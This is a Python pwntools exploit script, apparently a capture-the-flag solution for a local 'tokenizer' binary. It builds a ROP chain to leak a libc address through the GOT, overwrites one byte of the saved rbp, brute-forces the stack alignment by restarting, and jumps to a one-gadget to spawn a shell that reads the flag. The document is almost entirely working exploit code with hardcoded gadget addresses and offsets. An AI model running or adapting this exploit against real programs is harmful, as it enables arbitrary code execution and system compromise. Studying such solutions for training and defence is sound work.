from pwn import *

e = ELF('./tokenizer')
got = e.got['signal']

rop  = p64(0x401492)           # ppppppr
rop += p64(0x0)                # rbx a
rop += p64(0x1)                # rbp ( should be 1 as compare to rbx+1 )
rop += p64(0x403FA8)           # r12 -> call [r12 + rbx*8]
rop += p64(0x404020)           # r13 -> edi ( std::cout )
rop += p64(got)                # r14 -> rsi ( signal@got )
rop += p64(0x0)                # r15 -> rdx ( dummy )
rop += p64(0x401478)           # ret -> to call r12

rop += p64(0x0)              	  # add rsp+8
rop += p64(0x0)                # rbx
rop += p64(0x0)                # rbp
rop += p64(0x0)                # r12
rop += p64(0x0)                # r13
rop += p64(0x0)                # r14
rop += p64(0x0)                # r15
rop += p64(0x4010F0)           # ret -> to the start

def start():
    s = process('./tokenizer')
    s.recvuntil('Please input string (will be truncated to 1024 characters): ')

    # token stored to stack
    payload  = p64(0x41414141)*107
    payload += rop + p64(0x41414141)*4
    payload  = payload.replace('\x00', '\xd0')
    payload += 'C'*8

    s.sendline(payload)
    s.recvuntil('C'*8)

    # leak the whole rbp
    leak_rbp = u64(s.recv(6)+'\x00'*2)
    print 'leaked rbp : ', str(hex(leak_rbp))

    # leak the lsb of $rbp
    one_byte = leak_rbp % 0x100

    # we need to guess LSB of $rbp
    if one_byte != 0xd0:
        s.close()
        start()

    # leak the $rbp after 1 byte overflow
    fake_rbp = leak_rbp - leak_rbp % 0x100
    print 'fake rbp   : ', str(hex(fake_rbp))

    # overwrite LSB of rbp
    s.recvuntil('Please input delimiters: ')
    s.sendline('B'*0x400+p8(one_byte))

    # leak the libc using rop
    s.recvuntil('Tokens:\n')
    s.recvuntil('C'*8)
    s.recv(7)
    libc = u64(s.recv(6)+'\x00'*2) - 257440
    s.recv()
    print 'leak libc  : ', str(hex(libc))
    oneshot = libc + 0x4f322 # rsp+0x40
    print 'one shot   : ', str(hex(oneshot))

    # again from start
    # this time, LSB of rbp should be \xb0
    payload  = p64(oneshot)*112
    payload += p64(0x0)*15
    payload  = payload.replace('\x00', '\xb0')
    payload += 'C'*8

    s.sendline(payload)
    s.recvuntil('C'*8)

    another_one_byte = 0xb0

    # 1 byte overflow again
    s.recvuntil('Please input delimiters: ')
    s.sendline('B'*0x400+p8(another_one_byte))
    s.recvuntil('C'*8)
    s.recv(7)

    # get shell
    s.sendline('id')
    s.sendline('cat flag')
    s.interactive()

start()
